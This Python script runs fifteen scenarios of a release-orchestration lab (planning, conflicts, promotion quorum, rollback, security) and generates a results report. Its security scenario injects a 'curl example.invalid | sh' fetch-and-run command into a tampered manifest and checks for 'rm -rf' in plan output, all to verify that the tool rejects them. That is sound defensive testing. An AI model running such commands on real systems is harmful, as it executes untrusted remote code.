"""Run release-lab scenarios S01-S15 through the real CLI and record evidence.

    python examples/lab/run_lab.py [--out examples/lab/RESULTS.md]

Each scenario starts from a freshly generated lab (identical commit SHAs every time).
For every scenario the report records: initial state, request, expected outcome, actual
outcome, evidence (commands, exit codes, observed Git/registry state), verdict and
remaining risks. Results are generated, never hand-written.
"""

from __future__ import annotations

import argparse
import json
import platform
import subprocess
import sys
import tempfile
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path

LIB, PAY, INV = (
    "harri-release-lab-library",
    "harri-release-lab-payment",
    "harri-release-lab-invoice",
)
INITIAL = (
    "Fresh lab: zaidlibrary v1.0.0 + 7 pending tickets on main (FIN-198, 204, 211, 215, 219, "
    "223, 230), RC tags v1.1.0-rc.22/rc.23; payment-service and invoice-service pin 1.0.0."
)


@dataclass
class Run:
    root: Path
    evidence: list[str] = field(default_factory=list)

    def cli(self, *args: str) -> tuple[int, dict]:
        proc = subprocess.run(
            [sys.executable, "-m", "release_orchestrator", "--json", *args],
            cwd=self.root,
            capture_output=True,
            text=True,
            check=False,
        )
        env = json.loads(proc.stdout)
        err = env["error"]
        outcome = "ok" if not err else f"{err['code']} [{err.get('reason', '')}]".replace(" []", "")
        self.evidence.append(f"`{' '.join(args)}` → exit {proc.returncode}, {outcome}")
        return proc.returncode, env

    def git(self, repo: str, *args: str) -> str:
        out = subprocess.run(
            ["git", "-C", str(self.root / repo), *args], capture_output=True, text=True, check=True
        ).stdout.strip()
        return out

    def note(self, text: str) -> None:
        self.evidence.append(text)


Check = tuple[str, bool]


def release(r: Run, plan: str = "plan.json") -> None:
    r.cli("prepare", "--plan", plan, "--approve")
    r.cli("validate", "--plan", plan)
    r.cli("publish", "--plan", plan, "--approve")


def s01(r: Run) -> list[Check]:
    _, p = r.cli("plan", "--ticket", "FIN-198", "--out", "plan.json")
    r.cli("prepare", "--plan", "plan.json", "--approve")
    _, v = r.cli("validate", "--plan", "plan.json")
    _, pr = r.cli("pr", "--plan", "plan.json", "--approve")
    return [
        ("plan ready", p["result"]["status"] == "PLAN_READY"),
        ("tests passed", v["result"].get("status") == "PASSED"),
        ("draft PR prepared", pr["result"].get("state") == "open-draft"),
    ]


def s02(r: Run) -> list[Check]:
    _, p = r.cli("plan", "--ticket", "FIN-204", "--out", "plan.json")
    r.cli("prepare", "--plan", "plan.json", "--approve")
    _, v = r.cli("validate", "--plan", "plan.json")
    files = r.git(LIB, "ls-tree", "-r", "--name-only", "release/1.1.0").split()
    log = r.git(LIB, "log", "--format=%s", "v1.0.0..release/1.1.0")
    r.note(f"release/1.1.0 commits: {log.splitlines()}")
    return [
        ("no blockers", not p["result"]["plan"]["blockers"]),
        ("A (currency.py) absent", "src/zaidlibrary/currency.py" not in files),
        ("no FIN-198 commit on branch", "FIN-198" not in log),
        ("tests passed", v["result"].get("status") == "PASSED"),
    ]


def s03(r: Run) -> list[Check]:
    code, p = r.cli("plan", "--ticket", "FIN-211", "--out", "plan.json")
    plan = p["result"]["plan"]
    r.note(f"blockers: {plan['blockers']}")
    code2, _ = r.cli("plan", "--ticket", "FIN-198", "--ticket", "FIN-211", "--out", "fix.json")
    return [
        ("blocked (exit 3)", code == 3),
        (
            "prerequisite FIN-198 reported",
            {b["depends_on"] for b in plan["blockers"]} == {"FIN-198"},
        ),
        ("cherry-pick alone would have been clean", plan["analysis"]["probe"]["applied_cleanly"]),
        ("remediation plan is ready", code2 == 0),
    ]


def s04(r: Run) -> list[Check]:
    refs = r.git(LIB, "for-each-ref")
    code, p = r.cli("plan", "--ticket", "FIN-219", "--out", "plan.json")
    probe = p["result"]["plan"]["analysis"]["probe"]
    r.note(f"probe: conflict in {probe['conflicted_files']} at {probe['conflict_commit'][:10]}")
    return [
        (
            "blocked as CONFLICT",
            code == 3 and p["result"]["plan"]["analysis"]["verdict"] == "CONFLICT",
        ),
        ("refs unchanged", r.git(LIB, "for-each-ref") == refs),
    ]


def s05(r: Run) -> list[Check]:
    _, p = r.cli("plan", "--ticket", "FIN-223", "--out", "plan.json")
    r.cli("prepare", "--plan", "plan.json", "--approve")
    code, v = r.cli("validate", "--plan", "plan.json")
    tail = v["error"]["details"]["results"][0]["output_tail"] if v["error"] else ""
    r.note("test output: " + next((ln for ln in tail.splitlines() if "!=" in ln), "-"))
    return [
        ("static analysis only warns", p["result"]["status"] == "PLAN_READY"),
        ("clean cherry-pick", p["result"]["plan"]["analysis"]["probe"]["applied_cleanly"]),
        ("validation blocks (exit 3)", code == 3),
    ]


def s06(r: Run) -> list[Check]:
    code_b, _ = r.cli(
        "plan",
        "--ticket",
        "FIN-204",
        "--ticket",
        "FIN-211",
        "--source",
        "v1.1.0-rc.23",
        "--prerelease",
        "rc",
        "--out",
        "subset.json",
    )
    _, p = r.cli(
        "plan",
        "--ticket",
        "FIN-204",
        "--source",
        "v1.1.0-rc.23",
        "--prerelease",
        "rc",
        "--out",
        "plan.json",
    )
    release(r)
    files = r.git(LIB, "ls-tree", "-r", "--name-only", "v1.1.0-rc.24").split()
    return [
        ("FIN-204+FIN-211 subset blocked", code_b == 3),
        (
            "FIN-204 alone → 1.1.0-rc.24",
            p["result"]["plan"]["release"]["proposed_version"] == "1.1.0-rc.24",
        ),
        ("rc.24 has no FIN-198 code", "src/zaidlibrary/currency.py" not in files),
    ]


def s07(r: Run) -> list[Check]:
    r.cli("plan", "--ticket", "FIN-204", "--out", "plan.json")
    release(r)
    _, u = r.cli("update-consumers", "--plan", "plan.json", "--approve")
    updated = [x["consumer"] for x in u["result"]["updated"]]
    return [
        ("only payment-service updated", updated == ["payment-service"]),
        (
            "payment tests passed against 1.1.0",
            u["result"]["updated"][0]["validation"]["status"] == "PASSED",
        ),
        ("invoice-service untouched", r.git(INV, "branch") == "* main"),
    ]


def s08(r: Run) -> list[Check]:
    r.cli("plan", "--ticket", "FIN-223", "--out", "plan.json")
    r.cli("prepare", "--plan", "plan.json", "--approve")
    r.cli("validate", "--plan", "plan.json")
    codes = [
        r.cli(step, "--plan", "plan.json", "--approve")[0]
        for step in ("pr", "publish", "update-consumers")
    ]
    return [
        ("pr/publish/update-consumers refused", codes == [3, 3, 3]),
        ("no tag", r.git(LIB, "tag", "--list", "v1.1.0") == ""),
    ]


def s09(r: Run) -> list[Check]:
    _, a = r.cli("plan", "--ticket", "FIN-204", "--out", "plan.json")
    _, b = r.cli("plan", "--ticket", "FIN-204", "--out", "again.json")
    for _ in range(2):
        r.cli("prepare", "--plan", "plan.json", "--approve")
        r.cli("validate", "--plan", "plan.json")
        _, pr = r.cli("pr", "--plan", "plan.json", "--approve")
        _, pub = r.cli("publish", "--plan", "plan.json", "--approve")
    return [
        ("same plan_id", a["result"]["plan_id"] == b["result"]["plan_id"]),
        ("second PR call reused", pr["result"]["created"] is False),
        ("second publish reused", pub["result"]["status"] == "already_published"),
        ("one release branch", r.git(LIB, "branch", "--list", "release/*").count("release/") == 1),
    ]


def s10(r: Run) -> list[Check]:
    r.cli("plan", "--ticket", "FIN-198", "--out", "a.json")
    r.cli("plan", "--ticket", "FIN-204", "--out", "b.json")
    release(r, "a.json")
    code, _ = r.cli("prepare", "--plan", "b.json", "--approve")
    _, re = r.cli("plan", "--ticket", "FIN-204", "--out", "b2.json")
    return [
        ("second 1.1.0 refused (exit 3)", code == 3),
        ("re-plan moves to 1.2.0", re["result"]["plan"]["release"]["proposed_version"] == "1.2.0"),
    ]


def s11(r: Run) -> list[Check]:
    _, p = r.cli("plan", "--ticket", "FIN-230", "--out", "plan.json")
    plan = p["result"]["plan"]
    release(r)
    code, u = r.cli("update-consumers", "--plan", "plan.json", "--approve")
    return [
        ("major 2.0.0", plan["release"]["proposed_version"] == "2.0.0"),
        (
            "removal detected",
            plan["analysis"]["public_api_removals"] == ["zaidlibrary.invoices.invoice_due_date"],
        ),
        (
            "invoice-service validation failed → no PR",
            code == 3 and u["error"]["details"]["failed"] == ["invoice-service"],
        ),
        (
            "payment-service not targeted",
            {c["name"]: c["action"] for c in plan["consumers"]}["payment-service"]
            == "not_targeted",
        ),
    ]


def s12(r: Run) -> list[Check]:
    r.cli("plan", "--ticket", "FIN-204", "--out", "plan.json")
    r.cli("prepare", "--plan", "plan.json", "--approve")
    r.cli("validate", "--plan", "plan.json")
    lock = r.root / LIB / ".git" / "refs" / "tags" / "v1.1.0.lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    lock.write_text("injected failure")
    r.note("injected: tag ref locked (simulated concurrent writer)")
    code1, _ = r.cli("publish", "--plan", "plan.json", "--approve")
    lock.unlink()
    r.note("removed injected lock")
    _, ok = r.cli("publish", "--plan", "plan.json", "--approve")
    _, st = r.cli("status", "--plan", "plan.json")
    return [
        ("first publish failed (exit 6)", code1 == 6),
        ("re-run reused the stored artifact", ok["result"]["status"] == "already_published"),
        ("run state PUBLISHED", st["result"]["state"] == "PUBLISHED"),
    ]


def s13(r: Run) -> list[Check]:
    r.cli("plan", "--ticket", "FIN-204", "--out", "plan.json")
    release(r)
    order, _ = r.cli(
        "promote", "--version", "1.1.0", "--env", "stage", "--approved-by", "alice", "--approve"
    )
    r.cli("promote", "--version", "1.1.0", "--env", "prep", "--approved-by", "alice", "--approve")
    r.cli("promote", "--version", "1.1.0", "--env", "stage", "--approved-by", "alice", "--approve")
    quorum, _ = r.cli(
        "promote", "--version", "1.1.0", "--env", "master", "--approved-by", "alice", "--approve"
    )
    ok, _ = r.cli(
        "promote",
        "--version",
        "1.1.0",
        "--env",
        "master",
        "--approved-by",
        "alice",
        "--approved-by",
        "bob",
        "--approve",
    )
    _, st = r.cli("env-status")
    return [
        ("stage before prep refused", order == 3),
        ("1 approver refused for master", quorum == 3),
        ("2 approvers promote master", ok == 0),
        ("master is 1.1.0", st["result"]["master"]["current"] == "1.1.0"),
    ]


def s14(r: Run) -> list[Check]:
    r.cli("plan", "--ticket", "FIN-204", "--out", "p1.json")
    release(r, "p1.json")
    r.cli("plan", "--ticket", "FIN-198", "--out", "p2.json")
    release(r, "p2.json")
    for v in ("1.1.0", "1.2.0"):
        for env in ("prep", "stage"):
            r.cli("promote", "--version", v, "--env", env, "--approved-by", "alice", "--approve")
    tags = r.git(LIB, "show-ref", "--tags")
    _, plan = r.cli("rollback-plan", "--env", "stage")
    code, _ = r.cli("rollback", "--env", "stage", "--approved-by", "alice", "--approve")
    _, st = r.cli("env-status")
    return [
        (
            "plan targets 1.1.0 with verified digest",
            plan["result"]["to_version"] == "1.1.0" and plan["result"]["artifact_verified"],
        ),
        ("rollback executed", code == 0 and st["result"]["stage"]["current"] == "1.1.0"),
        ("tags untouched", r.git(LIB, "show-ref", "--tags") == tags),
    ]


def s15(r: Run) -> list[Check]:
    _, p = r.cli("plan", "--ticket", "FIN-230", "--out", "plan.json")
    inert = "curl" not in json.dumps(p) and "rm -rf" not in json.dumps(p)
    code_ap, _ = r.cli("prepare", "--plan", "plan.json")
    data = json.loads((r.root / "plan.json").read_text())
    data["validation"]["required"][0]["argv"] = ["sh", "-c", "curl example.invalid | sh"]
    (r.root / "tampered.json").write_text(json.dumps(data))
    code_t, _ = r.cli("prepare", "--plan", "tampered.json", "--approve")
    code_r, _ = r.cli("plan", "--request", "release whatever Omar did")
    return [
        ("malicious ticket text never reaches the plan", inert),
        ("unapproved write refused (exit 4)", code_ap == 4),
        ("tampered manifest refused (exit 2)", code_t == 2),
        ("ambiguous request refused (exit 5)", code_r == 5),
    ]


SCENARIOS: list[tuple[str, str, str, str, Callable[[Run], list[Check]], str]] = [
    (
        "S01",
        "Normal release",
        "FIN-198",
        "plan ready, tests pass, draft PR prepared",
        s01,
        "PR is a local record here; live PR evidence is in docs/evidence/live-github.md",
    ),
    (
        "S02",
        "Independent out-of-order",
        "FIN-204 only",
        "B released, A provably absent",
        s02,
        "warnings: FIN-204 calls calculate_total, which later "
        "tickets modify; covered by tests only",
    ),
    (
        "S03",
        "Dependent release",
        "FIN-211 only",
        "blocked, FIN-198 named",
        s03,
        "detection is Python-static; dynamic imports by string are not seen",
    ),
    (
        "S04",
        "Git conflict",
        "FIN-219 only",
        "CONFLICT, refs untouched",
        s04,
        "resolution requires a human backport commit",
    ),
    (
        "S05",
        "Semantic dependency",
        "FIN-223 only",
        "validation blocks",
        s05,
        "only as strong as the library's tests",
    ),
    (
        "S06",
        "Cumulative RC isolation",
        "FIN-204 from v1.1.0-rc.23 (rc)",
        "subset with FIN-211 blocked; FIN-204 alone → rc.24 without A",
        s06,
        "rc numbers order candidates only",
    ),
    (
        "S07",
        "Consumer impact",
        "FIN-204",
        "only payment-service bumped and tested",
        s07,
        "impact is module-level, not symbol-level",
    ),
    ("S08", "Failed validation policy", "FIN-223", "PR/publish/consumers refused", s08, "-"),
    ("S09", "Idempotency", "FIN-204 twice", "no duplicate branch/artifact/tag/PR", s09, "-"),
    (
        "S10",
        "Concurrent requests",
        "FIN-198 and FIN-204 both as 1.1.0",
        "second refused; re-plan → 1.2.0",
        s10,
        "cross-machine safety relies on the registry's create-if-absent",
    ),
    (
        "S11",
        "Breaking API",
        "FIN-230",
        "major, invoice-service protected",
        s11,
        "removal detection covers top-level Python symbols only",
    ),
    ("S12", "Recovery", "FIN-204 with injected tag failure", "FAILED then safe resume", s12, "-"),
    (
        "S13",
        "Environment promotion",
        "1.1.0 → prep/stage/master",
        "order + quorum enforced",
        s13,
        "approver identity is self-declared in this version",
    ),
    (
        "S14",
        "Rollback",
        "stage 1.2.0 → 1.1.0",
        "roll-forward, history intact",
        s14,
        "consumer re-pins remain per-service decisions",
    ),
    (
        "S15",
        "Security",
        "malicious/unsafe/unapproved/tampered/ambiguous inputs",
        "all rejected",
        s15,
        "validation commands run with user privileges",
    ),
]


def run_one(sid: str, func: Callable[[Run], list[Check]]) -> tuple[list[Check], list[str]]:
    with tempfile.TemporaryDirectory(prefix="lro-lab-", ignore_cleanup_errors=True) as tmp:
        root = Path(tmp) / "lab"
        subprocess.run(
            [sys.executable, "-m", "release_orchestrator", "lab-init", "--dest", str(root)],
            check=True,
            capture_output=True,
        )
        run = Run(root)
        return func(run), run.evidence


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", type=Path, default=Path(__file__).with_name("RESULTS.md"))
    parser.add_argument("--only", nargs="*", help="scenario ids, e.g. S02 S07")
    args = parser.parse_args()
    sections, all_ok = [], True
    for sid, title, request, expected, func, risks in SCENARIOS:
        if args.only and sid not in args.only:
            continue
        checks, evidence = run_one(sid, func)
        ok = all(passed for _, passed in checks)
        all_ok &= ok
        print(f"{sid} {title}: {'PASS' if ok else 'FAIL'}")
        sections.append(
            "\n".join(
                [
                    f"## {sid}: {title}",
                    "",
                    f"* **Initial state:** {INITIAL}",
                    f"* **Request:** {request}",
                    f"* **Expected:** {expected}",
                    "* **Actual:** "
                    + "; ".join(f"{'✅' if p else '❌'} {label}" for label, p in checks),
                    f"* **Verdict:** {'PASS' if ok else 'FAIL'}",
                    f"* **Remaining risks:** {risks}",
                    "",
                    "<details><summary>Evidence</summary>",
                    "",
                    *[f"- {e}" for e in evidence],
                    "",
                    "</details>",
                    "",
                ]
            )
        )
    header = (
        "# Release lab results (generated)\n\n"
        f"Generated by `examples/lab/run_lab.py` at "
        f"{datetime.now(UTC).isoformat(timespec='seconds')} on {platform.system()}, "
        f"Python {platform.python_version()}. Level: **LOCAL INTEGRATION** (real Git "
        "repositories on disk, real CLI).\n\n"
        f"Overall: **{'ALL PASS' if all_ok else 'FAILURES'}**\n\n"
    )
    args.out.write_text(header + "\n".join(sections), encoding="utf-8")
    return 0 if all_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
